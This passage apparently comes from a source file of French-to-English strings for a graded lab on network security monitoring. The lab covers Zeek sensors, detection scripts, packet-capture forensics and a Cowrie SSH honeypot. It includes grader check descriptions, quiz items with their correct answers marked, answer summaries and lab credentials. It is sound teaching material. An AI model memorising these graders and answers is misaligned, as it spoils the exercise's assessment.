`/opt/cowrie` (un environnement virtuel `cowrie-env`), et tourne sous l'utilisateur **`cowrie`** (il
refuse de tourner en root) :

| chemin | contenu |
|--------|---------|
| `/opt/cowrie/etc/cowrie.cfg` | la configuration (créée par `cowrie init` : une copie commentée des valeurs par défaut, comme `cowrie.cfg.dist`) |
| `/opt/cowrie/etc/userdb.txt` | les comptes acceptés (absent : ceux de `userdb.example`) |
| `/opt/cowrie/var/log/cowrie/cowrie.json` | les événements, un objet JSON par ligne |
| `/opt/cowrie/var/log/cowrie/cowrie.log` | le journal du programme (démarrage, erreurs de configuration) |
| `/opt/cowrie/var/lib/cowrie/tty/` | les sessions enregistrées (à rejouer avec `playlog`) |
| `/opt/cowrie/var/lib/cowrie/downloads/` | les fichiers téléchargés par les attaquants, nommés par leur SHA-256 |

`cowrie.cfg` est un fichier INI ; seules les clés modifiées comptent (Cowrie lit d'abord ses valeurs par
défaut). Les commentaires tiennent sur leur propre ligne, jamais en fin de ligne :

```
[honeypot]
# le nom affiché par l'invite, hostname et uname
hostname = web-old-17
# le nom de la sonde, dans chaque événement (champ sensor)
sensor_name = hp-site-a

[shell]
# ce qu'affiche uname -r
kernel_version = 5.10.0-18-amd64

[ssh]
# la bannière envoyée au client
version = SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u4
listen_endpoints = tcp:2222:interface=0.0.0.0
```

`userdb.txt` : une règle par ligne, `utilisateur:x:mot_de_passe`, lues de haut en bas, **la première qui
correspond décide** ; `*` désigne n'importe quel utilisateur ou mot de passe, un mot de passe précédé de
`!` **refuse**, `/regex/` est une expression régulière (`/regex/i` sans casse) ; une tentative qu'aucune
règle ne reconnaît est refusée :

```
root:x:!root
root:x:!123456
root:x:*
admin:x:admin
```

(`root` avec tout mot de passe sauf `root` et `123456` ; `admin` avec `admin` seulement ; tout autre
compte refusé.)

Cowrie écoute sur le port 2222 : un utilisateur ordinaire ne peut pas ouvrir un port inférieur à 1024.
On lui redirige le port 22 par nftables, après avoir déplacé le vrai `sshd` sur un autre port (`Port`
dans un fichier de `/etc/ssh/sshd_config.d/`, puis `systemctl restart ssh`) :

```
table inet honeypot {
    chain prerouting {
        type nat hook prerouting priority dstnat; policy accept;
        tcp dport 22 redirect to :2222
    }
}
```

Le service `cowrie.service` est fourni, non activé : `systemctl enable --now cowrie`, puis
`systemctl restart cowrie` après chaque modification (Cowrie lit sa configuration au démarrage
seulement), `journalctl -u cowrie` et `cowrie.log` en cas d'échec.
""": """

**Cowrie** is a medium-interaction SSH and Telnet honeypot, written in Python. It is installed here in
`/opt/cowrie` (a virtual environment `cowrie-env`), and runs as the user **`cowrie`** (it refuses to run
as root):

| path | content |
|------|---------|
| `/opt/cowrie/etc/cowrie.cfg` | the configuration (created by `cowrie init`: a commented copy of the default values, like `cowrie.cfg.dist`) |
| `/opt/cowrie/etc/userdb.txt` | the accepted accounts (if missing: those of `userdb.example`) |
| `/opt/cowrie/var/log/cowrie/cowrie.json` | the events, one JSON object per line |
| `/opt/cowrie/var/log/cowrie/cowrie.log` | the program's log (startup, configuration errors) |
| `/opt/cowrie/var/lib/cowrie/tty/` | the recorded sessions (to replay with `playlog`) |
| `/opt/cowrie/var/lib/cowrie/downloads/` | the files downloaded by the attackers, named after their SHA-256 |

`cowrie.cfg` is an INI file; only the changed keys matter (Cowrie reads its default values first).
Comments stand on their own line, never at the end of a line:

```
[honeypot]
# the name shown by the prompt, hostname and uname
hostname = web-old-17
# the name of the sensor, in every event (field sensor)
sensor_name = hp-site-a

[shell]
# what uname -r prints
kernel_version = 5.10.0-18-amd64

[ssh]
# the banner sent to the client
version = SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u4
listen_endpoints = tcp:2222:interface=0.0.0.0
```

`userdb.txt`: one rule per line, `user:x:password`, read from top to bottom, **the first one that
matches decides**; `*` stands for any user or password, a password preceded by `!` **refuses**,
`/regex/` is a regular expression (`/regex/i` case-insensitive); an attempt that no rule matches is
refused:

```
root:x:!root
root:x:!123456
root:x:*
admin:x:admin
```

(`root` with any password except `root` and `123456`; `admin` with `admin` only; any other account
refused.)

Cowrie listens on port 2222: an ordinary user cannot open a port below 1024. Port 22 is redirected to
it by nftables, after moving the real `sshd` to another port (`Port` in a file of
`/etc/ssh/sshd_config.d/`, then `systemctl restart ssh`):

```
table inet honeypot {
    chain prerouting {
        type nat hook prerouting priority dstnat; policy accept;
        tcp dport 22 redirect to :2222
    }
}
```

The service `cowrie.service` is provided, not enabled: `systemctl enable --now cowrie`, then
`systemctl restart cowrie` after each change (Cowrie reads its configuration at startup only),
`journalctl -u cowrie` and `cowrie.log` in case of failure.
""",
        "Les journaux de Cowrie": "The Cowrie logs",
        """

Chaque événement de `cowrie.json` porte `eventid`, `timestamp` (UTC), `src_ip`, `session` (12 chiffres
hexadécimaux, propres à une connexion) et `sensor` :

| `eventid` | champs propres |
|-----------|----------------|
| `cowrie.session.connect` | `src_port`, `dst_ip`, `dst_port` |
| `cowrie.client.version` | `version` : le logiciel du client (`SSH-2.0-Go`, `SSH-2.0-libssh_0.9.6`...) |
| `cowrie.client.kex` | `hassh` : l'empreinte des algorithmes proposés par le client |
| `cowrie.login.failed`, `cowrie.login.success` | `username`, `password` |
| `cowrie.command.input` | `input` : la ligne tapée |
| `cowrie.session.file_download` | `url`, `shasum` (SHA-256), `outfile`, `destfile` |
| `cowrie.session.closed` | `duration` |

```
jq -r 'select(.eventid == "cowrie.login.success") | [.src_ip, .username, .password] | @tsv' cowrie.json
jq -r 'select(.eventid == "cowrie.command.input") | [.session, .input] | @tsv' cowrie.json
jq -r 'select(.eventid == "cowrie.login.failed") | .src_ip' cowrie.json | sort | uniq -c | sort -rn
```
""": """

Each event of `cowrie.json` carries `eventid`, `timestamp` (UTC), `src_ip`, `session` (12 hexadecimal
digits, specific to one connection) and `sensor`:

| `eventid` | specific fields |
|-----------|-----------------|
| `cowrie.session.connect` | `src_port`, `dst_ip`, `dst_port` |
| `cowrie.client.version` | `version`: the client's software (`SSH-2.0-Go`, `SSH-2.0-libssh_0.9.6`...) |
| `cowrie.client.kex` | `hassh`: the fingerprint of the algorithms offered by the client |
| `cowrie.login.failed`, `cowrie.login.success` | `username`, `password` |
| `cowrie.command.input` | `input`: the line typed |
| `cowrie.session.file_download` | `url`, `shasum` (SHA-256), `outfile`, `destfile` |
| `cowrie.session.closed` | `duration` |

```
jq -r 'select(.eventid == "cowrie.login.success") | [.src_ip, .username, .password] | @tsv' cowrie.json
jq -r 'select(.eventid == "cowrie.command.input") | [.session, .input] | @tsv' cowrie.json
jq -r 'select(.eventid == "cowrie.login.failed") | .src_ip' cowrie.json | sort | uniq -c | sort -rn
```
""",
        "Corréler des journaux": "Correlating logs",
        """

Une même activité laisse des traces dans plusieurs journaux, chacun avec sa vue : le pot de miel voit la
session (les identifiants, les commandes), la sonde réseau voit les connexions (volumes, durées, et ce
que la machine attaquée contacte ensuite). Relier ces traces, c'est les **corréler**. Les clés :

- le **temps** : des horloges synchronisées (NTP), en UTC, et une marge (un journal note le début d'une
  connexion, un autre sa fin) ;
- le **quintuplet** : adresses, ports et protocole. Le port source d'un client change à chaque connexion,
  ce qui en fait une bonne clé ; attention aux traductions d'adresses et de ports (NAT, redirection :
  le pot de miel note le port 2222 que la redirection lui a donné, la sonde a vu le port 22) ;
- les identifiants : `uid` (Zeek), `session` (Cowrie), `community_id` (commun à plusieurs outils).

À grande échelle, un **SIEM** (Wazuh, Elastic, Splunk...) centralise les journaux, les normalise et
automatise ces corrélations ; à la main, `jq` suffit :

```
jq -r 'select(.session == "a1b2c3d4e5f6" and .eventid == "cowrie.session.connect")
       | [.src_ip, .src_port] | @tsv' cowrie.json
jq -c 'select(."id.orig_h" == "203.0.113.7" and ."id.orig_p" == 51234)' conn.log
```
""": """

The same activity leaves traces in several logs, each with its own view: the honeypot sees the session
(the credentials, the commands), the network sensor sees the connections (volumes, durations, and what
the attacked machine contacts next). Linking these traces together is **correlating** them. The keys:

- **time**: synchronised clocks (NTP), in UTC, and a margin (one log records the start of a
  connection, another its end);
- the **5-tuple**: addresses, ports and protocol. The source port of a client changes with every
  connection, which makes it a good key; beware of address and port translations (NAT, redirection:
  the honeypot records the port 2222 that the redirection gave it, the sensor saw port 22);
- the identifiers: `uid` (Zeek), `session` (Cowrie), `community_id` (shared by several tools).

At large scale, a **SIEM** (Wazuh, Elastic, Splunk...) centralises the logs, normalises them and
automates these correlations; by hand, `jq` is enough:

```
jq -r 'select(.session == "a1b2c3d4e5f6" and .eventid == "cowrie.session.connect")
       | [.src_ip, .src_port] | @tsv' cowrie.json
jq -c 'select(."id.orig_h" == "203.0.113.7" and ."id.orig_p" == 51234)' conn.log
```
""",
        "Aide-mémoire": "Cheat sheet",
        """

| besoin | commande |
|--------|----------|
| appliquer la configuration de la sonde | `zeekctl deploy` (puis `zeekctl status`) |
| les journaux de la sonde | `ls /opt/zeek/logs/current/` |
| analyser une capture | `mkdir t && cd t && zeek -C -r ../capture.pcap local` |
| essayer un script | `zeek -C -r capture.pcap script.zeek` puis `cat notice.log` |
| extraire des colonnes | `zeek-cut ...` (TSV), `jq` (JSON) |
| vérifier une empreinte | `sha256sum -c fichier.sha256`, `sha256sum fichier` |
| extraire les fichiers HTTP d'une capture | `tshark -r f.pcap --export-objects http,/tmp/objets` |
| redémarrer Cowrie | `systemctl restart cowrie` |
| les événements de Cowrie | `tail -f /opt/cowrie/var/log/cowrie/cowrie.json \\| jq -c .` |
| les règles nftables | `nft list ruleset` |
| les ports en écoute | `ss -ltnp` |
""": """

| need | command |
|------|---------|
| apply the sensor's configuration | `zeekctl deploy` (then `zeekctl status`) |
| the sensor's logs | `ls /opt/zeek/logs/current/` |
| analyse a capture | `mkdir t && cd t && zeek -C -r ../capture.pcap local` |
| try a script | `zeek -C -r capture.pcap script.zeek` then `cat notice.log` |
| extract columns | `zeek-cut ...` (TSV), `jq` (JSON) |
| check a hash | `sha256sum -c file.sha256`, `sha256sum file` |
| extract the HTTP files of a capture | `tshark -r f.pcap --export-objects http,/tmp/objets` |
| restart Cowrie | `systemctl restart cowrie` |
| the Cowrie events | `tail -f /opt/cowrie/var/log/cowrie/cowrie.json \\| jq -c .` |
| the nftables rules | `nft list ruleset` |
| the listening ports | `ss -ltnp` |
""",
        "Partie 1 seule : la sonde Zeek configurée et lancée.": "Part 1 alone: the Zeek sensor configured and running.",
        "Partie 2 seule : les deux scripts de détection.": "Part 2 alone: the two detection scripts.",
        "Partie 3 seule : le fichier extrait et les réponses de l'enquête.": "Part 3 alone: the extracted file and the answers of the investigation.",
        "Partie 4 seule : le pot de miel Cowrie.": "Part 4 alone: the Cowrie honeypot.",
        "Partie 5 seule : les réponses de la corrélation.": "Part 5 alone: the answers of the correlation.",
        "Bonus seul : les indicateurs du cadre Intel.": "Bonus alone: the indicators of the Intel framework.",
        "Solution de référence complète (toutes les parties et le bonus, formulaires remplis).": "Complete reference solution (every part and the bonus, forms filled in).",
        """
| réseau | préfixe | machines |
|--------|---------|----------|
| `wan` (« Internet ») | `{wan}` | `gw` eth0 (`{gw_wan}`), `attacker` (`{attacker}`, votre machine d'attaque) |
| `dmz` (un **concentrateur**) | `{dmz}` | `gw` eth1 (`{gw_dmz}`), `www` (`{www}`, serveur web et DNS de `corp.lab`), `honeypot` (`{hp}`), `sensor` eth1 (**sans adresse**) |
| `lan` (interne) | `{lan}` | `gw` eth2 (`{gw_lan}`), `sensor` eth0 (`{sensor}`, gestion de la sonde), `analyst` (`{analyst}`, poste d'investigation) |
""": """
| network | prefix | machines |
|---------|--------|----------|
| `wan` ("Internet") | `{wan}` | `gw` eth0 (`{gw_wan}`), `attacker` (`{attacker}`, your attack machine) |
| `dmz` (a **hub**) | `{dmz}` | `gw` eth1 (`{gw_dmz}`), `www` (`{www}`, web and DNS server of `corp.lab`), `honeypot` (`{hp}`), `sensor` eth1 (**no address**) |
| `lan` (internal) | `{lan}` | `gw` eth2 (`{gw_lan}`), `sensor` eth0 (`{sensor}`, management of the sensor), `analyst` (`{analyst}`, forensics workstation) |
""",
        "Organisation du TP": "Organisation of the lab",
        """
Lisez l'onglet **Informations** : il présente la supervision de sécurité réseau, Zeek (journaux,
zeekctl, scripts, cadre Intel), l'analyse d'une capture, les pots de miel et Cowrie, la corrélation des
journaux.

**La maquette** (onglet *Schéma*) : un routeur `gw` relie « Internet » (`wan`, où se trouve votre
machine `attacker`) à une DMZ et au réseau interne `lan`. La DMZ est un **concentrateur** (*hub*) : la
sonde `sensor` y voit tout le trafic.
""": """
Read the **Informations** tab: it presents network security monitoring, Zeek (logs, zeekctl, scripts,
the Intel framework), the analysis of a capture, honeypots and Cowrie, log correlation.

**The topology** (*Schema* tab): a router `gw` connects the "Internet" (`wan`, where your machine
`attacker` sits) to a DMZ and to the internal network `lan`. The DMZ is a **hub**: the sensor `sensor`
sees all its traffic.
""",
        """
Déjà en place (ne pas modifier) : les adresses et les routes, les noms dans `/etc/hosts` (`www`,
`honeypot`, `sensor`, `analyst`...), le serveur web et le serveur DNS de `corp.lab` sur `www`, le vrai
serveur SSH de `honeypot` (comptes `student` / `student` et `root` / `root`, sur le port 22 pour
l'instant). Zeek (`/opt/zeek`) et Cowrie (`/opt/cowrie`) sont installés, arrêtés, sur `sensor`,
`honeypot` et `analyst`. Les pièces de l'enquête sont sur `analyst`, dans `/root/evidence/`.

Règles valables pour tout le TP :

- chaque **partie est indépendante** : la terminer donne ses points quel que soit l'état des autres.
  Ce qui est noté est l'état final des machines et vos réponses : laissez vos configurations en place ;
- l'évaluation est surtout **comportementale** : une machine cachée de `wan` utilise les adresses
  `{first}` et `{second}` pour des requêtes HTTP et DNS vers `www` et des connexions SSH vers
  `honeypot` (ports 22 et {admin}) ; vous verrez ces adresses dans les journaux, c'est normal. Elle
  rejoue aussi hors ligne, sur `sensor`, des captures avec vos scripts ;
- les parties 3 et 5 sont des enquêtes : leurs réponses se donnent dans les formulaires ;
- une évaluation automatique a lieu toutes les cinq minutes.
""": """
Already in place (do not modify): the addresses and the routes, the names in `/etc/hosts` (`www`,
`honeypot`, `sensor`, `analyst`...), the web server and the DNS server of `corp.lab` on `www`, the real
SSH server of `honeypot` (accounts `student` / `student` and `root` / `root`, on port 22 for now). Zeek
(`/opt/zeek`) and Cowrie (`/opt/cowrie`) are installed, stopped, on `sensor`, `honeypot` and `analyst`.
The evidence of the investigation is on `analyst`, in `/root/evidence/`.

Rules for the whole lab:

- each **part is independent**: completing it gives its points whatever the state of the others. What
  is graded is the final state of the machines and your answers: leave your configurations in place;
- the evaluation is mostly **behavioural**: a hidden machine of `wan` uses the addresses `{first}` and
  `{second}` for HTTP and DNS requests to `www` and SSH connections to `honeypot` (ports 22 and
  {admin}); you will see these addresses in the logs, that is normal. It also replays captures offline,
  on `sensor`, with your scripts;
- parts 3 and 5 are investigations: their answers are given in the forms;
- an automatic evaluation takes place every five minutes.
""",
        "Partie 1 — La sonde Zeek": "Part 1 — The Zeek sensor",
        "Mettre la sonde en service": "Putting the sensor into service",
        """
Sur `sensor`, l'interface `eth1` (sans adresse) est branchée sur le concentrateur de la DMZ et
l'interface `eth0` sur le réseau interne (gestion). Configurez Zeek (sections @@ref:zeek@@ à
@@ref:zeekctl@@) :

1. `node.cfg` : une sonde autonome qui capture sur **`eth1`** ;
2. `networks.cfg` : exactement les deux réseaux internes, la DMZ `{dmz}` et le réseau `lan` `{lan}` ;
   « Internet » (`wan`) utilise ici `{wan}`, une plage que Zeek range par défaut parmi les adresses
   privées, donc locales : dans `local.zeek`, faites que seul `networks.cfg` compte ;
3. `local.zeek` : des journaux au format **JSON** ;
4. `zeekctl deploy`, puis `zeekctl status`.

Depuis `attacker`, visitez `http://www/` et faites une requête DNS (`dig @www www.corp.lab`), depuis
`analyst` aussi, puis lisez `/opt/zeek/logs/current/` (`conn.log`, `http.log`, `dns.log`) : retrouvez
vos requêtes et le sens que Zeek leur donne (`local_orig`, `local_resp`). L'évaluation fait de même.
""": """
On `sensor`, the interface `eth1` (no address) is plugged into the DMZ hub and the interface `eth0`
into the internal network (management). Configure Zeek (sections @@ref:zeek@@ to
@@ref:zeekctl@@):

1. `node.cfg`: a standalone sensor capturing on **`eth1`**;
2. `networks.cfg`: exactly the two internal networks, the DMZ `{dmz}` and the `lan` network `{lan}`;
   the "Internet" (`wan`) uses `{wan}` here, a range that Zeek counts by default among the private
   addresses, hence local: in `local.zeek`, make `networks.cfg` alone count;
3. `local.zeek`: logs in **JSON** format;
4. `zeekctl deploy`, then `zeekctl status`.

From `attacker`, visit `http://www/` and make a DNS query (`dig @www www.corp.lab`), from `analyst`
too, then read `/opt/zeek/logs/current/` (`conn.log`, `http.log`, `dns.log`): find your requests and
the direction Zeek gives them (`local_orig`, `local_resp`). The evaluation does the same.
""",
        "Zeek tourne sur sensor et capture sur eth1": "Zeek runs on sensor and captures on eth1",
        "la requête HTTP de l'évaluation est dans http.log, au format JSON": "the evaluation's HTTP request is in http.log, in JSON format",
        "conn.log : wan → www entrante (local_orig F, local_resp T), analyst → www interne (T, T)": "conn.log: wan → www inbound (local_orig F, local_resp T), analyst → www internal (T, T)",
        "la requête DNS de l'évaluation est dans dns.log": "the evaluation's DNS query is in dns.log",
        "Ce que Zeek écrit": "What Zeek writes",
        """
- que désigne le champ `uid` présent dans `conn.log`, `http.log`, `dns.log`... ? @@{uid:>une connexion : toutes les lignes qui la concernent portent le même uid>>>connection|la sonde qui a écrit la ligne>>>sensor|l'utilisateur connecté au serveur>>>user}@@
- à quoi sert `networks.cfg` ? @@{networks:>dire quels réseaux sont locaux : Zeek en déduit le sens des connexions (local_orig, local_resp)>>>direction|choisir les réseaux à capturer>>>capture|exclure des réseaux de l'analyse>>>exclude}@@
- que voit Zeek d'une session HTTPS ? @@{https:>les métadonnées : nom du serveur (SNI), certificat, versions, volumes, pas les URL ni le contenu>>>metadata|tout, il déchiffre TLS>>>everything|rien du tout>>>nothing}@@
""": """
- what does the field `uid`, present in `conn.log`, `http.log`, `dns.log`..., identify? @@{uid:>a connection: every line about it carries the same uid>>>connection|the sensor that wrote the line>>>sensor|the user logged in to the server>>>user}@@
- what is `networks.cfg` for? @@{networks:>saying which networks are local: Zeek derives the direction of the connections from it (local_orig, local_resp)>>>direction|choosing the networks to capture>>>capture|excluding networks from the analysis>>>exclude}@@
- what does Zeek see of an HTTPS session? @@{https:>the metadata: server name (SNI), certificate, versions, volumes, but neither the URLs nor the content>>>metadata|everything, it decrypts TLS>>>everything|nothing at all>>>nothing}@@
""",
        "uid = une connexion ; networks.cfg = le sens ; HTTPS = les métadonnées": "uid = a connection; networks.cfg = the direction; HTTPS = the metadata",
        "Partie 2 — Écrire des scripts de détection": "Part 2 — Writing detection scripts",
        "Deux scripts de détection": "Two detection scripts",
        """
Sur `sensor`, écrivez dans `{dir}` (sections @@ref:scripting@@ et @@ref:notice@@) :

1. **`web-scan.zeek`** : une notice **`SRE::Web_Scan`**, avec `$src` = l'adresse du client, quand un même
   client reçoit au moins **{n}** réponses HTTP **404** en moins de **2 minutes**, comptées à partir de sa
   première 404. **Une seule** notice par client. Ni {below} réponses 404, ni des réponses 200, ni {n}
   réponses 404 étalées sur plusieurs minutes ne doivent en lever.
2. **`honeypot.zeek`** : une notice **`SRE::Honeypot_Outbound`**, avec `$conn`, pour **toute connexion
   ouverte par** le pot de miel `{hp}`, quel que soit le protocole (TCP, UDP...). Les connexions qu'il
   **reçoit** (les attaques) ne doivent pas en lever.

Mettez-les au point hors ligne sur la capture `{training}`, qui contient ces cas :

```
cd $(mktemp -d) && zeek -C -r {training} {dir}/web-scan.zeek && jq -c . notice.log
```

(les journaux sont en TSV si vous ne chargez pas `policy/tuning/json-logs` : `cat notice.log`).
L'évaluation rejoue **chaque script seul**, hors ligne, sur une autre capture des mêmes cas (d'autres
adresses), avec des journaux JSON : elle ne dépend pas de la partie 1.
""": """
On `sensor`, write in `{dir}` (sections @@ref:scripting@@ and @@ref:notice@@):

1. **`web-scan.zeek`**: a notice **`SRE::Web_Scan`**, with `$src` = the client's address, when one
   client receives at least **{n}** HTTP **404** answers within **2 minutes**, counted from its first
   404. **A single** notice per client. Neither {below} 404 answers, nor 200 answers, nor {n} 404
   answers spread over several minutes may raise one.
2. **`honeypot.zeek`**: a notice **`SRE::Honeypot_Outbound`**, with `$conn`, for **every connection
   opened by** the honeypot `{hp}`, whatever the protocol (TCP, UDP...). The connections it
   **receives** (the attacks) must not raise one.

Debug them offline on the capture `{training}`, which contains these cases:

```
cd $(mktemp -d) && zeek -C -r {training} {dir}/web-scan.zeek && jq -c . notice.log
```

(the logs are in TSV if you do not load `policy/tuning/json-logs`: `cat notice.log`). The evaluation
replays **each script alone**, offline, on another capture of the same cases (other addresses), with
JSON logs: it does not depend on part 1.
""",
        "SRE::Web_Scan pour le client aux nombreuses 404 (2), une seule fois (1)": "SRE::Web_Scan for the client with many 404s (2), only once (1)",
        "SRE::Web_Scan dès le seuil atteint exactement": "SRE::Web_Scan as soon as the threshold is reached exactly",
        "aucune notice sous le seuil, pour des réponses 200, ni pour des 404 étalées (fenêtre de 2 min)": "no notice below the threshold, for 200 answers, nor for spread-out 404s (2 min window)",
        "SRE::Honeypot_Outbound pour la connexion TCP ouverte par le pot de miel (2), avec $conn (1)": "SRE::Honeypot_Outbound for the TCP connection opened by the honeypot (2), with $conn (1)",
        "SRE::Honeypot_Outbound pour une requête DNS (UDP) du pot de miel": "SRE::Honeypot_Outbound for a DNS query (UDP) of the honeypot",
        "aucune notice pour les connexions reçues par le pot de miel ni pour les autres machines": "no notice for the connections received by the honeypot nor for the other machines",
        "Partie 3 — Enquête sur une capture": "Part 3 — Investigating a capture",
        "L'enquête": "The investigation",
        """
Il y a quelques jours, l'équipe d'exploitation a remarqué un trafic inhabituel. La sonde enregistrait
alors tout le trafic de la DMZ et du réseau interne : la capture est sur `analyst`, dans `{pcap}`, avec
son empreinte `{pcap}.sha256`. Reconstituez l'incident (sections @@ref:response@@, @@ref:pcap@@ et
@@ref:patterns@@) : vérifiez d'abord l'intégrité de la preuve, puis travaillez sur une copie, avec Zeek
(`zeek -C -r ... local`), `zeek-cut` ou `jq`, et `tshark`.

Les machines de la capture : le serveur de fichiers `files` (`{files}`), l'application `intranet`
(`{intranet}`, `intranet.corp.lab`), le résolveur DNS `{resolver}`, des postes du réseau interne
`{lan}` ; les adresses de `{wan}` et les autres sont « Internet ».
""": """
A few days ago, the operations team noticed unusual traffic. The sensor was then recording all the
traffic of the DMZ and of the internal network: the capture is on `analyst`, in `{pcap}`, with its hash
`{pcap}.sha256`. Reconstruct the incident (sections @@ref:response@@, @@ref:pcap@@ and
@@ref:patterns@@): first check the integrity of the evidence, then work on a copy, with Zeek
(`zeek -C -r ... local`), `zeek-cut` or `jq`, and `tshark`.

The machines of the capture: the file server `files` (`{files}`), the application `intranet`
(`{intranet}`, `intranet.corp.lab`), the DNS resolver `{resolver}`, workstations of the internal network
`{lan}`; the addresses of `{wan}` and the others are the "Internet".
""",
        "Le balayage": "The scan",
        """
- l'adresse de la machine qui a balayé les ports de `files` : @@{scanner:[0-9.]+}@@
- les ports **ouverts** que ce balayage a trouvés, séparés par des virgules (par exemple `25,110`) : @@{ports:[0-9, ]+}@@
""": """
- the address of the machine that scanned the ports of `files`: @@{scanner:[0-9.]+}@@
- the **open** ports that this scan found, separated by commas (for example `25,110`): @@{ports:[0-9, ]+}@@
""",
        "l'adresse du scanner (2) et les ports ouverts trouvés (2)": "the scanner's address (2) and the open ports found (2)",
        "La recherche de mots de passe": "The password guessing",
        """
- le compte visé par la recherche de mots de passe sur `intranet` : @@{account:.+}@@
- le mot de passe finalement trouvé (décodé) : @@{password:.+}@@
""": """
- the account targeted by the password guessing on `intranet`: @@{account:.+}@@
- the password eventually found (decoded): @@{password:.+}@@
""",
        "le compte visé (2) et le mot de passe trouvé (2)": "the targeted account (2) and the password found (2)",
        "Le fichier malveillant": "The malicious file",
        """
L'attaquant a déposé un fichier sur `intranet`, qu'un poste interne a ensuite téléchargé.

- le poste interne qui l'a téléchargé : @@{victim:[0-9.]+}@@
- le nom du fichier : @@{file:.+}@@
- son empreinte SHA-256 : @@{sha256:[0-9a-fA-F]+}@@

Extrayez aussi le fichier de la capture dans `/root/evidence/extracted/` (sous le nom de votre choix) :
l'évaluation y cherche un fichier de cette empreinte.
""": """
The attacker dropped a file on `intranet`, which an internal workstation then downloaded.

- the internal workstation that downloaded it: @@{victim:[0-9.]+}@@
- the name of the file: @@{file:.+}@@
- its SHA-256 hash: @@{sha256:[0-9a-fA-F]+}@@

Also extract the file from the capture into `/root/evidence/extracted/` (under any name you like): the
evaluation looks there for a file with this hash.
""",
        "le poste (1), le nom du fichier (1), son SHA-256 (3)": "the workstation (1), the file name (1), its SHA-256 (3)",
        "un fichier de /root/evidence/extracted a le SHA-256 du fichier malveillant": "a file of /root/evidence/extracted has the SHA-256 of the malicious file",
        "La balise": "The beacon",
        """
Le poste compromis contacte ensuite régulièrement un serveur de commande et contrôle (C2).

- le nom de domaine du C2 : @@{c2_domain:.+}@@
- son adresse IP : @@{c2_ip:[0-9.]+}@@
- la période de ses requêtes, en secondes (à une seconde près) : @@{period:[0-9.,]+}@@
""": """
The compromised workstation then regularly contacts a command and control (C2) server.

- the domain name of the C2: @@{c2_domain:.+}@@
- its IP address: @@{c2_ip:[0-9.]+}@@
- the period of its requests, in seconds (to within one second): @@{period:[0-9.,]+}@@
""",
        "le domaine du C2 (2), son adresse (1), la période (2)": "the C2 domain (2), its address (1), the period (2)",
        "L'exfiltration": "The exfiltration",
        """
Des données sont sorties du réseau sans connexion HTTP.

- le domaine qui reçoit les données : @@{exfil_domain:.+}@@
- la valeur de `code=` dans les données exfiltrées : @@{code:.+}@@
""": """
Data left the network without any HTTP connection.

- the domain that receives the data: @@{exfil_domain:.+}@@
- the value of `code=` in the exfiltrated data: @@{code:.+}@@
""",
        "le domaine de l'exfiltration (2), le code (2)": "the exfiltration domain (2), the code (2)",
        "Partie 4 — Le pot de miel Cowrie": "Part 4 — The Cowrie honeypot",
        "Déployer Cowrie": "Deploying Cowrie",
        """
Sur `honeypot` (sections @@ref:honeypot@@ et @@ref:cowrie@@), faites de la machine un pot de miel
crédible :

1. déplacez le vrai serveur SSH sur le port **{admin}**, et n'ouvrez ce port qu'au réseau `lan`
   (`{lan}`) : depuis `wan`, il doit être fermé ;
2. faites répondre **Cowrie** sur le port **22** ;
3. son identité, dans `cowrie.cfg` : le nom d'hôte `{hostname}`, la bannière SSH `{banner}`, la version
   du noyau `{kernel}` (ce qu'affiche `uname -r`), le nom de sonde `{sensor}` ;
4. ses comptes, dans `userdb.txt` : `root` accepté avec `{p1}`, `{p2}` ou `{p3}`, et **aucun autre** mot
   de passe ; `{user2}` accepté avec n'importe quel mot de passe **sauf** `{refused}` ; tout autre compte
   refusé ;
5. Cowrie lancé par systemd, sous l'utilisateur `cowrie`, et activé au démarrage.

Testez depuis `attacker` (`ssh root@honeypot`, puis `hostname`, `uname -a`, `ls`...) en suivant
`cowrie.json`, et depuis `analyst` : `ssh -p {admin} student@honeypot`. L'évaluation se connecte depuis
`wan` aux ports 22 et {admin} avec des comptes justes et faux, et depuis `analyst` au port {admin}.
""": """
On `honeypot` (sections @@ref:honeypot@@ and @@ref:cowrie@@), turn the machine into a credible
honeypot:

1. move the real SSH server to port **{admin}**, and open this port to the `lan` network (`{lan}`)
   only: from `wan`, it must be closed;
2. make **Cowrie** answer on port **22**;
3. its identity, in `cowrie.cfg`: the host name `{hostname}`, the SSH banner `{banner}`, the kernel
   version `{kernel}` (what `uname -r` prints), the sensor name `{sensor}`;
4. its accounts, in `userdb.txt`: `root` accepted with `{p1}`, `{p2}` or `{p3}`, and **no other**
   password; `{user2}` accepted with any password **except** `{refused}`; any other account
   refused;
5. Cowrie started by systemd, as the user `cowrie`, and enabled at boot.

Test from `attacker` (`ssh root@honeypot`, then `hostname`, `uname -a`, `ls`...) while following
`cowrie.json`, and from `analyst`: `ssh -p {admin} student@honeypot`. The evaluation connects from
`wan` to ports 22 and {admin} with right and wrong accounts, and from `analyst` to port {admin}.
""",
        "le vrai serveur SSH répond sur le port 22222 depuis lan": "the real SSH server answers on port 22222 from lan",
        "le port 22222 est fermé depuis wan": "port 22222 is closed from wan",
        "le port 22 envoie la bannière demandée (Cowrie)": "port 22 sends the requested banner (Cowrie)",
        "Cowrie tourne sous l'utilisateur cowrie (2), le service est activé (1)": "Cowrie runs as the user cowrie (2), the service is enabled (1)",
        "le nom d'hôte (2), la version du noyau (2), le nom de sonde des événements (2)": "the host name (2), the kernel version (2), the sensor name of the events (2)",
        "root avec un mot de passe de la liste (1), refusé avec un autre (2) ; le second compte avec un mot de passe quelconque (1), refusé avec le mot de passe exclu (2) ; un compte inconnu refusé (1)": "root with a password of the list (1), refused with another one (2); the second account with any password (1), refused with the excluded password (2); an unknown account refused (1)",
        """
- Cowrie est un pot de miel à interaction... @@{level:>moyenne : il émule un shell, rien n'est réellement exécuté>>>medium|haute : c'est un vrai système>>>high|basse : il note seulement les connexions>>>low}@@
- pourquoi toute connexion à un pot de miel est-elle suspecte ? @@{suspicious:>il n'offre aucun service légitime : personne n'a de raison de s'y connecter>>>no-use|son adresse est secrète>>>secret|il n'accepte que les attaquants>>>attackers}@@
- le principal risque d'un pot de miel mal isolé ? @@{risk:>servir de rebond vers d'autres machines : filtrer ses connexions sortantes>>>pivot|qu'il soit trop lent>>>slow|qu'il refuse les attaquants>>>refuse}@@
""": """
- Cowrie's level of interaction is... @@{level:>medium: it emulates a shell, nothing is really executed>>>medium|high: it is a real system>>>high|low: it only records the connections>>>low}@@
